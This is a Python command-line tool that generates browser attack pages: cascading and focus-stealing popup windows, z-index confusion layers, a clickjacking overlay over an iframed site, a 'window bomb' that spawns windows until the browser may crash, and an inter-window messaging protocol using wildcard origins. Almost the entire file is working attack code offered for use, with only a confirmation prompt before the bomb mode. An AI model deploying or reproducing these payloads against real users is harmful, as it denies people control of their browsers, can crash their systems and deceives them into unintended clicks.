#!/usr/bin/env python3
"""
💥 Popup Collusion Module
Multi-window coordination attacks

Author: frankSx <fixes.it.frank@googlesmail.com>
13th Hour Research Division

Creates coordinated multi-window attacks that exploit
browser window management and focus systems.
"""

import argparse
import json
from typing import List, Dict, Optional
import random


class PopupCollusionGenerator:
    """Generate popup collusion attack scripts"""

    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)
        self.window_id = 0

    def generate_cascade_attack(self,
                               count: int = 10,
                               delay: int = 500) -> str:
        """
        Generate JavaScript for cascade popup attack

        Opens windows in cascade pattern with increasing offsets
        designed to confuse window managers.
        """
        js_code = f'''
/* 💥 GHOSTBYTE Popup Cascade Attack */
/* Window Count: {count} */
/* Delay: {delay}ms */

(function() {{
    'use strict';

    const windows = [];
    const count = {count};
    const delay = {delay};

    function openCascadeWindow(index) {{
        const offset = index * 30;
        const width = 400 - (index * 20);
        const height = 300 - (index * 15);

        const features = [
            `width=${{width}}`,
            `height=${{height}}`,
            `left=${{offset}}`,
            `top=${{offset}}`,
            `toolbar=no`,
            `location=no`,
            `directories=no`,
            `status=no`,
            `menubar=no`,
            `scrollbars=no`,
            `resizable=yes`,
            `titlebar=no`
        ].join(',');

        const w = window.open('', `_ghostbyte_${{index}}`, features);

        if (w) {{
            w.document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>GHOSTBYTE Window ${{index}}</title>
                    <style>
                        body {{
                            margin: 0;
                            padding: 20px;
                            background: hsl(${{index * 36}}, 70%, 50%);
                            font-family: monospace;
                            overflow: hidden;
                        }}
                        .id {{
                            font-size: 48px;
                            font-weight: bold;
                            color: white;
                            text-align: center;
                            margin-top: 40px;
                        }}
                    </style>
                </head>
                <body>
                    <div class="id">${{index}}</div>
                    <script>
                        // Coordinate with parent
                        window.opener.postMessage({{
                            type: 'GHOSTBYTE_REGISTER',
                            id: ${{index}},
                            timestamp: Date.now()
                        }}, '*');

                        // Cascade focus confusion
                        setInterval(() => {{
                            if (Math.random() > 0.7) {{
                                window.focus();
                                window.moveBy(${{Math.random() * 10 - 5}}, 
                                            ${{Math.random() * 10 - 5}});
                            }}
                        }}, 100);
                    </script>
                </body>
                </html>
            `);
            w.document.close();
            windows.push(w);
        }}

        if (index < count - 1) {{
            setTimeout(() => openCascadeWindow(index + 1), delay);
        }}
    }}

    // Listen for coordination messages
    window.addEventListener('message', (e) => {{
        if (e.data.type === 'GHOSTBYTE_REGISTER') {{
            console.log('Window registered:', e.data.id);
        }}
    }});

    // Start cascade
    openCascadeWindow(0);

    // Periodic focus confusion
    setInterval(() => {{
        windows.forEach((w, i) => {{
            if (w && !w.closed && Math.random() > 0.5) {{
                w.focus();
            }}
        }});
    }}, 2000);

}})();
'''
        return js_code

    def generate_z_index_confusion(self,
                                  count: int = 20) -> str:
        """
        Generate HTML/CSS for z-index confusion attack

        Creates overlapping layers with extreme z-index values
        and dynamic reordering.
        """
        html_parts = [
            '<!DOCTYPE html>',
            '<html>',
            '<head>',
            '<title>💥 GHOSTBYTE Z-Index Confusion</title>',
            '<style>',
            'body { margin: 0; overflow: hidden; background: black; }',
            '.layer {',
            '    position: absolute;',
            '    width: 200px;',
            '    height: 200px;',
            '    border: 3px solid white;',
            '    display: flex;',
            '    align-items: center;',
            '    justify-content: center;',
            '    font-size: 24px;',
            '    font-weight: bold;',
            '    font-family: monospace;',
            '    transition: all 0.3s;',
            '}',
            '</style>',
            '</head>',
            '<body>'
        ]

        for i in range(count):
            z_index = random.choice([
                random.randint(0, 100),
                random.randint(1000, 9999),
                random.randint(1000000, 9999999),
                2147483647,  # Max z-index
                -2147483648  # Min z-index
            ])

            left = random.randint(0, 80)
            top = random.randint(0, 80)
            color = f"hsl({i * (360/count)}, 100%, 50%)"

            html_parts.append(
                f'<div class="layer" id="layer-{i}" '
                f'style="z-index: {z_index}; left: {left}%; top: {top}%; '
                f'background: {color}; opacity: 0.8;">{i}</div>'
            )

        html_parts.extend([
            '<script>',
            '// Constant z-index manipulation',
            'setInterval(() => {',
            '    document.querySelectorAll(".layer").forEach(layer => {',
            '        if (Math.random() > 0.7) {',
            '            layer.style.zIndex = Math.floor(Math.random() * 1000000);',
            '        }',
            '    });',
            '}, 100);',
            '</script>',
            '</body>',
            '</html>'
        ])

        return '\n'.join(html_parts)

    def generate_focus_stealing_chain(self,
                                     count: int = 5) -> str:
        """
        Generate focus stealing chain attack

        Rapidly shifts focus between windows to prevent
        user interaction with legitimate UI.
        """
        js_code = f'''
/* 💥 GHOSTBYTE Focus Stealing Chain */
/* Window Count: {count} */

(function() {{
    const windows = [];
    let currentIndex = 0;

    // Open windows
    for (let i = 0; i < {count}; i++) {{
        const w = window.open('', `_focus_chain_${{i}}`, 
            'width=300,height=200,left=' + (i * 50) + ',top=' + (i * 50));
        if (w) {{
            w.document.write(`
                <body style="background: hsl(${{i * 60}}, 70%, 50%)">
                    <h1>Window ${{i}}</h1>
                </body>
            `);
            w.document.close();
            windows.push(w);
        }}
    }}

    // Rapid focus rotation
    function rotateFocus() {{
        if (windows.length === 0) return;

        const w = windows[currentIndex % windows.length];
        if (w && !w.closed) {{
            w.focus();
            w.moveTo(
                Math.random() * (screen.width - 300),
                Math.random() * (screen.height - 200)
            );
        }}

        currentIndex++;

        // Random interval for unpredictability
        const nextDelay = Math.random() * 500 + 100;
        setTimeout(rotateFocus, nextDelay);
    }}

    // Start rotation
    rotateFocus();

    // Prevent window close
    window.onbeforeunload = function() {{
        return "GHOSTBYTE: Closing will terminate chain";
    }};

}})();
'''
        return js_code

    def generate_overlay_poisoning(self,
                                  legitimate_url: str = "https://example.com",
                                  overlay_content: str = "MALICIOUS") -> str:
        """
        Generate clickjacking-style overlay attack

        Creates transparent overlays that capture clicks
        intended for underlying content.
        """
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>💥 GHOSTBYTE Overlay Poisoning</title>
    <style>
        body {{
            margin: 0;
            font-family: monospace;
        }}
        #legitimate {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }}
        #overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            background: rgba(255, 0, 0, 0.1);
            pointer-events: none;  /* Let clicks pass through visually */
        }}
        .trap {{
            position: absolute;
            pointer-events: auto;  /* But capture on specific elements */
            background: rgba(0, 255, 0, 0.3);
            border: 2px dashed red;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
        }}
        #notification {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: black;
            color: lime;
            padding: 20px;
            border: 2px solid lime;
            font-family: monospace;
            z-index: 1001;
        }}
    </style>
</head>
<body>
    <iframe id="legitimate" src="{legitimate_url}"></iframe>

    <div id="overlay">
        <div class="trap" style="top: 20%; left: 30%; width: 200px; height: 50px;"
             onclick="captureClick('Button Trap')">
            {overlay_content}
        </div>
        <div class="trap" style="top: 50%; left: 50%; width: 150px; height: 150px;"
             onclick="captureClick('Content Trap')">
            CLICK HERE
        </div>
    </div>

    <div id="notification">
        <h3>💥 GHOSTBYTE Overlay Attack</h3>
        <p>Clicks captured: <span id="count">0</span></p>
        <div id="log"></div>
    </div>

    <script>
        let clickCount = 0;

        function captureClick(type) {{
            clickCount++;
            document.getElementById('count').textContent = clickCount;

            const log = document.getElementById('log');
            const entry = document.createElement('div');
            entry.textContent = `${{new Date().toLocaleTimeString()}}: ${{type}} clicked`;
            log.prepend(entry);

            // Visual feedback
            document.body.style.background = 'red';
            setTimeout(() => {{
                document.body.style.background = '';
            }}, 100);

            return false;
        }}

        // Log all clicks
        document.addEventListener('click', (e) => {{
            console.log('Click at:', e.clientX, e.clientY);
        }});
    </script>
</body>
</html>'''
        return html

    def generate_window_bomb(self,
                            count: int = 100) -> str:
        """
        Generate window bomb (rapid window spawning)

        WARNING: Can crash browsers or systems.
        """
        js_code = f'''
/* 💥 GHOSTBYTE Window Bomb */
/* WARNING: Can crash systems */
/* Count: {count} */

(function() {{
    let opened = 0;
    const max = {count};

    function spawn() {{
        if (opened >= max) return;

        const x = Math.random() * screen.width;
        const y = Math.random() * screen.height;
        const w = Math.random() * 300 + 100;
        const h = Math.random() * 200 + 100;

        window.open('', `_bomb_${{opened}}`, 
            `width=${{w}},height=${{h}},left=${{x}},top=${{y}}`);

        opened++;

        // Exponential spawning
        setTimeout(spawn, Math.max(10, 1000 / opened));
    }}

    spawn();
}})();
'''
        return js_code

    def generate_coordination_protocol(self) -> str:
        """Generate inter-window communication protocol"""
        protocol = {
            'name': 'GHOSTBYTE_POPUP_PROTOCOL',
            'version': '1.0',
            'message_types': [
                'REGISTER',      # Window registration
                'FOCUS_REQUEST', # Request focus
                'FOCUS_GRANT',   # Grant focus
                'POSITION',      # Position update
                'CLOSE_ALL',     # Close all windows
                'EXECUTE'        # Execute code
            ],
            'commands': {
                'cascade': 'Arrange windows in cascade',
                'tile': 'Tile windows across screen',
                'focus_ring': 'Rotate focus continuously',
                'flash_all': 'Flash all windows',
                'move_random': 'Move all windows randomly'
            }
        }

        js_code = f'''
/* 💥 GHOSTBYTE Popup Coordination Protocol v1.0 */

const GHOSTBYTE_PROTOCOL = {json.dumps(protocol, indent=4)};

class PopupCoordinator {{
    constructor() {{
        this.windows = new Map();
        this.id = Math.random().toString(36).substr(2, 9);
        this.setupMessaging();
    }}

    setupMessaging() {{
        window.addEventListener('message', (e) => {{
            const data = e.data;
            if (!data.GHOSTBYTE) return;

            switch(data.type) {{
                case 'REGISTER':
                    this.windows.set(data.id, e.source);
                    console.log('Registered:', data.id);
                    break;

                case 'FOCUS_REQUEST':
                    if (data.target === this.id) {{
                        window.focus();
                        e.source.postMessage({{
                            GHOSTBYTE: true,
                            type: 'FOCUS_GRANT',
                            to: data.id
                        }}, '*');
                    }}
                    break;

                case 'EXECUTE':
                    if (data.command && GHOSTBYTE_PROTOCOL.commands[data.command]) {{
                        this.execute(data.command, data.args);
                    }}
                    break;

                case 'CLOSE_ALL':
                    this.closeAll();
                    break;
            }}
        }});
    }}

    broadcast(message) {{
        message.GHOSTBYTE = true;
        message.from = this.id;
        this.windows.forEach((win, id) => {{
            if (!win.closed) {{
                win.postMessage(message, '*');
            }}
        }});
    }}

    execute(command, args = {{}}) {{
        console.log('Executing:', command, args);
        // Implementation specific to command
    }}

    closeAll() {{
        this.windows.forEach((win) => {{
            if (!win.closed) win.close();
        }});
        this.windows.clear();
    }}
}}

// Initialize coordinator
const coordinator = new PopupCoordinator();
'''
        return js_code


def main():
    parser = argparse.ArgumentParser(description='💥 GHOSTBYTE Popup Collusion Generator')
    parser.add_argument('--mode',
                       choices=['cascade', 'zindex', 'focus', 'overlay', 'bomb', 'protocol'],
                       required=True)
    parser.add_argument('--output', '-o', default='popup_attack.html')
    parser.add_argument('--count', type=int, default=10)
    parser.add_argument('--delay', type=int, default=500)
    parser.add_argument('--seed', type=int)

    args = parser.parse_args()

    if args.mode == 'bomb':
        print("⚠️  WARNING: Window bomb can crash browsers!")
        confirm = input("Type 'CONFIRM' to proceed: ")
        if confirm != 'CONFIRM':
            print("Aborted.")
            return

    generator = PopupCollusionGenerator(seed=args.seed)

    if args.mode == 'cascade':
        result = generator.generate_cascade_attack(args.count, args.delay)
    elif args.mode == 'zindex':
        result = generator.generate_z_index_confusion(args.count)
    elif args.mode == 'focus':
        result = generator.generate_focus_stealing_chain(args.count)
    elif args.mode == 'overlay':
        result = generator.generate_overlay_poisoning()
    elif args.mode == 'bomb':
        result = generator.generate_window_bomb(args.count)
    elif args.mode == 'protocol':
        result = generator.generate_coordination_protocol()

    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(result)

    print(f"💥 Popup collusion attack generated: {args.output}")
    print(f"   Mode: {args.mode}")
    print(f"   Windows: {args.count if args.mode != 'protocol' else 'N/A'}")


if __name__ == '__main__':
    main()
